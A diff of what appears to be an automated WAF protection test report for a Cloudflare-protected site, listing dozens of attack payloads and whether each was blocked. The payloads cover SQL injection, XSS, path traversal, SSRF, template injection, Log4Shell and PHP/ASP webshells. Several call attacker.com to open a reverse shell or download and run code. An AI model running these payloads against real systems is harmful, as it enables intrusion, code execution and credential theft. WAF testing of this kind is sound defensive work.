@@ -2,9 +2,9 @@
 CLOUDFLARE WAF/DDOS PROTECTION TEST REPORT
 ============================================================
 
-Test Duration: 46.35 seconds
-Start Time: 2026-01-13T11:36:48.864369
-End Time: 2026-01-13T11:37:35.215189
+Test Duration: 47.09 seconds
+Start Time: 2026-01-13T11:42:04.731625
+End Time: 2026-01-13T11:42:51.821772
 
 ------------------------------------------------------------
 SUMMARY
@@ -17,3 +17,1873 @@ WAF Bypasses Found: 0
 ------------------------------------------------------------
 WAF TEST RESULTS
 ------------------------------------------------------------
+
+Test: SQLi: Basic SQLi - OR bypass
+  Category: SQL Injection
+  Payload: ' OR '1'='1
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.821s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi with comment
+  Category: SQL Injection
+  Payload: ' OR '1'='1'--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.115s
+  CF-Ray: 9bd6b02d9924a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi with block comment
+  Category: SQL Injection
+  Payload: ' OR '1'='1'/*
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.321s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi AND condition
+  Category: SQL Injection
+  Payload: 1' AND '1'='1
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.324s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: UNION based SQLi
+  Category: SQL Injection
+  Payload: 1 UNION SELECT NULL,NULL,NULL--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.126s
+  CF-Ray: 9bd6b03298b2a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: UNION data extraction
+  Category: SQL Injection
+  Payload: 1 UNION SELECT username,password FROM users--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.110s
+  CF-Ray: 9bd6b0337a10a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi DROP TABLE
+  Category: SQL Injection
+  Payload: '; DROP TABLE users;--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.122s
+  CF-Ray: 9bd6b0344b39a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi command execution
+  Category: SQL Injection
+  Payload: 1'; EXEC xp_cmdshell('whoami');--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.107s
+  CF-Ray: 9bd6b0351c5aa219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: MySQL comment SQLi
+  Category: SQL Injection
+  Payload: ' OR 1=1#
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.102s
+  CF-Ray: 9bd6b035ed66a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Simple auth bypass
+  Category: SQL Injection
+  Payload: admin'--
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.190s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: ORDER BY injection
+  Category: SQL Injection
+  Payload: 1' ORDER BY 1--+
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.325s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: GROUP BY injection
+  Category: SQL Injection
+  Payload: 1' GROUP BY 1--+
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.358s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Negative UNION SQLi
+  Category: SQL Injection
+  Payload: -1' UNION SELECT 1,2,3--+
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.119s
+  CF-Ray: 9bd6b03c4eeba219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Time-based blind SQLi
+  Category: SQL Injection
+  Payload: 1' AND SLEEP(5)--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.217s
+  CF-Ray: 9bd6b03d1832a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Benchmark SQLi
+  Category: SQL Injection
+  Payload: 1' AND BENCHMARK(10000000,SHA1('test'))--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.171s
+  CF-Ray: 9bd6b03efb5fa219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Subquery sleep SQLi
+  Category: SQL Injection
+  Payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.119s
+  CF-Ray: 9bd6b03fcc62a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: MSSQL time delay
+  Category: SQL Injection
+  Payload: 1' WAITFOR DELAY '0:0:5'--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.120s
+  CF-Ray: 9bd6b040adf6a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: MSSQL shutdown
+  Category: SQL Injection
+  Payload: 1'; SHUTDOWN;--
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.212s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Error-based SQLi
+  Category: SQL Injection
+  Payload: 1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.132s
+  CF-Ray: 9bd6b042e914a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: ExtractValue SQLi
+  Category: SQL Injection
+  Payload: 1' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.170s
+  CF-Ray: 9bd6b0440ad0a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: XSS: Basic script tag XSS
+  Category: Cross-Site Scripting
+  Payload: <script>alert('XSS')</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.106s
+  CF-Ray: 9bd6b044ec6fa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: IMG onerror XSS
+  Category: Cross-Site Scripting
+  Payload: <img src=x onerror=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.116s
+  CF-Ray: 9bd6b045bddca219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: SVG onload XSS
+  Category: Cross-Site Scripting
+  Payload: <svg onload=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.097s
+  CF-Ray: 9bd6b0468f0aa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Body onload XSS
+  Category: Cross-Site Scripting
+  Payload: <body onload=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.098s
+  CF-Ray: 9bd6b0473807a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: JavaScript protocol XSS
+  Category: Cross-Site Scripting
+  Payload: javascript:alert('XSS')
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.109s
+  CF-Ray: 9bd6b047f924a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Iframe XSS
+  Category: Cross-Site Scripting
+  Payload: <iframe src='javascript:alert(1)'>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.126s
+  CF-Ray: 9bd6b048ba52a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Input autofocus XSS
+  Category: Cross-Site Scripting
+  Payload: <input onfocus=alert('XSS') autofocus>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.133s
+  CF-Ray: 9bd6b0498bcfa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Marquee XSS
+  Category: Cross-Site Scripting
+  Payload: <marquee onstart=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.142s
+  CF-Ray: 9bd6b04a6d2ca219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Details ontoggle XSS
+  Category: Cross-Site Scripting
+  Payload: <details open ontoggle=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.243s
+  CF-Ray: 9bd6b04b6e87a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Video source XSS
+  Category: Cross-Site Scripting
+  Payload: <video><source onerror=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.115s
+  CF-Ray: 9bd6b04d0919a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Encoded XSS
+  Category: Cross-Site Scripting
+  Payload: '><script>alert(String.fromCharCode(88,83,83))</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.145s
+  CF-Ray: 9bd6b04dda31a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Base64 encoded XSS
+  Category: Cross-Site Scripting
+  Payload: <img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.122s
+  CF-Ray: 9bd6b04edbaca219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: SVG without space
+  Category: Cross-Site Scripting
+  Payload: <svg/onload=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.109s
+  CF-Ray: 9bd6b04face0a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Nested tags XSS
+  Category: Cross-Site Scripting
+  Payload: <<script>alert('XSS')//<</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.104s
+  CF-Ray: 9bd6b0507e19a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Split tag XSS
+  Category: Cross-Site Scripting
+  Payload: <scr<script>ipt>alert('XSS')</scr</script>ipt>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.100s
+  CF-Ray: 9bd6b0513f12a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Attribute escape XSS
+  Category: Cross-Site Scripting
+  Payload: "><img src=x onerror=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.097s
+  CF-Ray: 9bd6b051f821a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: JS string break XSS
+  Category: Cross-Site Scripting
+  Payload: '-alert('XSS')-'
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.108s
+  CF-Ray: 9bd6b052991aa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Title escape XSS
+  Category: Cross-Site Scripting
+  Payload: </title><script>alert('XSS')</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.098s
+  CF-Ray: 9bd6b0535a13a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Textarea escape XSS
+  Category: Cross-Site Scripting
+  Payload: </textarea><script>alert('XSS')</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.103s
+  CF-Ray: 9bd6b0540afaa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: MathML XSS
+  Category: Cross-Site Scripting
+  Payload: <math><maction actiontype='statusline#http://google.com' xlink:href='javascript:alert(1)'>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.116s
+  CF-Ray: 9bd6b054cbfda219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Basic command injection
+  Category: Command Injection
+  Payload: ; ls -la
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.204s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Pipe command injection
+  Category: Command Injection
+  Payload: | cat /etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.281s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Ampersand command injection
+  Category: Command Injection
+  Payload: & whoami
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.320s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Backtick command injection
+  Category: Command Injection
+  Payload: `id`
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.224s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Dollar command injection
+  Category: Command Injection
+  Payload: $(id)
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.186s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Semicolon injection
+  Category: Command Injection
+  Payload: ; cat /etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.203s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: OR command injection
+  Category: Command Injection
+  Payload: || whoami
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.182s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: AND command injection
+  Category: Command Injection
+  Payload: && id
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.302s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Newline injection
+  Category: Command Injection
+  Payload: 
+/bin/cat /etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.208s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Ping command injection
+  Category: Command Injection
+  Payload: ; ping -c 10 127.0.0.1
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.371s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Netcat reverse shell
+  Category: Command Injection
+  Payload: | nc -e /bin/sh attacker.com 4444
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.104s
+  CF-Ray: 9bd6b0659c70a219-MSP
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Curl shell download
+  Category: Command Injection
+  Payload: ; curl http://attacker.com/shell.sh | sh
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.232s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Nested curl injection
+  Category: Command Injection
+  Payload: $(curl http://attacker.com/shell.sh | sh)
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.201s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Wget injection
+  Category: Command Injection
+  Payload: `wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.175s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Python injection
+  Category: Command Injection
+  Payload: | python -c 'import os; os.system("id")'
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.215s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: LFI: Basic path traversal
+  Category: Path Traversal
+  Payload: ../../../etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.213s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Double dot traversal
+  Category: Path Traversal
+  Payload: ....//....//....//etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.234s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: URL encoded traversal
+  Category: Path Traversal
+  Payload: ..%2f..%2f..%2fetc/passwd
+  Status: NOT BLOCKED (HTTP 400)
+  Response Time: 0.062s
+  CF-Ray: -
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Double URL encoded
+  Category: Path Traversal
+  Payload: ..%252f..%252f..%252fetc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.300s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Null byte injection
+  Category: Path Traversal
+  Payload: /etc/passwd%00
+  Status: NOT BLOCKED (HTTP 400)
+  Response Time: 0.054s
+  CF-Ray: -
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Backslash traversal
+  Category: Path Traversal
+  Payload: ....\/....\/....\/etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.361s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Full URL encoded
+  Category: Path Traversal
+  Payload: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+  Status: NOT BLOCKED (HTTP 400)
+  Response Time: 0.059s
+  CF-Ray: -
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: UTF-8 encoded traversal
+  Category: Path Traversal
+  Payload: ..%c0%af..%c0%af..%c0%afetc/passwd
+  Status: BLOCKED (HTTP 500)
+  Response Time: 0.413s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Unicode slash traversal
+  Category: Path Traversal
+  Payload: ..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.291s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Proc environ access
+  Category: Path Traversal
+  Payload: /proc/self/environ
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.189s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: PHP filter wrapper
+  Category: Path Traversal
+  Payload: php://filter/convert.base64-encode/resource=index.php
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.170s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: File protocol
+  Category: Path Traversal
+  Payload: file:///etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.158s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Windows SAM traversal
+  Category: Path Traversal
+  Payload: ....//....//....//windows/system32/config/sam
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.198s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Triple encoded
+  Category: Path Traversal
+  Payload: %252e%252e%252f%252e%252e%252fetc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.169s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: XXE: Basic XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.159s
+  CF-Ray: 9bd6b07f1a48a219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: External XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.127s
+  CF-Ray: 9bd6b07fdb75a219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: Parameter entity XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>...
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.126s
+  CF-Ray: 9bd6b080ccb9a219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: Expect wrapper XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.168s
+  CF-Ray: 9bd6b081fe6aa219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: PHP filter XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource...
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.121s
+  CF-Ray: 9bd6b082cfa6a219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: SSRF: Localhost SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://localhost/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.262s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Loopback SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://127.0.0.1/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.185s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: IPv6 localhost SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://[::1]/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.192s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: AWS metadata SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://169.254.169.254/latest/meta-data/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.279s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: GCP metadata SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://metadata.google.internal/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.219s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Azure metadata SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://169.254.169.254/metadata/v1/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.263s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Zero IP SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://0.0.0.0:22
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.185s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Short loopback SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://127.1/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.286s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Decimal IP SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://2130706433/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.195s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Hex IP SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://0x7f000001/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.223s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Gopher SSRF
+  Category: Server-Side Request Forgery
+  Payload: gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.196s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Dict protocol SSRF
+  Category: Server-Side Request Forgery
+  Payload: dict://localhost:11211/stats
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.216s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: File protocol SSRF
+  Category: Server-Side Request Forgery
+  Payload: file:///etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.369s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSTI: Jinja2/Twig basic SSTI
+  Category: Server-Side Template Injection
+  Payload: {{7*7}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.178s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Generic template injection
+  Category: Server-Side Template Injection
+  Payload: ${7*7}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.286s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Ruby ERB injection
+  Category: Server-Side Template Injection
+  Payload: #{7*7}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.186s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: ERB injection
+  Category: Server-Side Template Injection
+  Payload: <%= 7*7 %>
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.264s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Angular SSTI
+  Category: Server-Side Template Injection
+  Payload: {{constructor.constructor('return this')()}}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.095s
+  CF-Ray: 9bd6b09dfe73a219-MSP
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Flask config disclosure
+  Category: Server-Side Template Injection
+  Payload: {{config}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.243s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Python SSTI RCE
+  Category: Server-Side Template Injection
+  Payload: {{self.__class__.__mro__[2].__subclasses__()}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.373s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Polyglot template injection
+  Category: Server-Side Template Injection
+  Payload: ${{<%[%'"}}%\
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.102s
+  CF-Ray: 9bd6b0a2ad34a219-MSP
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Jinja2 RCE
+  Category: Server-Side Template Injection
+  Payload: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.229s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: Log4Shell: Log4j basic
+  Category: Log4j RCE
+  Payload: ${jndi:ldap://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.113s
+  CF-Ray: 9bd6b0a4f865a219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j RMI
+  Category: Log4j RCE
+  Payload: ${jndi:rmi://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.131s
+  CF-Ray: 9bd6b0a5ca6ea219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j obfuscated
+  Category: Log4j RCE
+  Payload: ${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.187s
+  CF-Ray: 9bd6b0a73c6aa219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j heavy obfuscation
+  Category: Log4j RCE
+  Payload: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.126s
+  CF-Ray: 9bd6b0a80db3a219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j DNS bypass
+  Category: Log4j RCE
+  Payload: ${jndi:ldap://127.0.0.1#attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.197s
+  CF-Ray: 9bd6b0a8ef3ea219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: CF-Managed: PHP webshell
+  Category: php-injection
+  Payload: <?php system($_GET['cmd']); ?>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.131s
+  CF-Ray: 9bd6b0aa3964a219-MSP
+
+Test: CF-Managed: ASP.NET webshell
+  Category: aspnet-injection
+  Payload: <%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe");%>
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.202s
+
+Test: CF-Managed: Apache htaccess access
+  Category: sensitive-files
+  Payload: .htaccess
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.201s
+
+Test: CF-Managed: WordPress config access
+  Category: wordpress
+  Payload: wp-config.php
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.112s
+  CF-Ray: 9bd6b0adde78a219-MSP
+
+Test: CF-Managed: WordPress Duplicator vuln
+  Category: wordpress-cve
+  Payload: /wp-admin/admin-ajax.php?action=duplicator_download
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.104s
+  CF-Ray: 9bd6b0aeafc6a219-MSP
+
+Test: CF-Managed: WordPress SQLi
+  Category: wordpress
+  Payload: SELECT * FROM wp_users
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.310s
+
+Test: CF-Managed: phpMyAdmin access
+  Category: admin-panels
+  Payload: phpMyAdmin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.202s
+
+Test: CF-Managed: Joomla admin access
+  Category: joomla
+  Payload: /administrator/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.189s
+
+Test: CF-Managed: Drupal settings access
+  Category: drupal
+  Payload: Drupal.settings
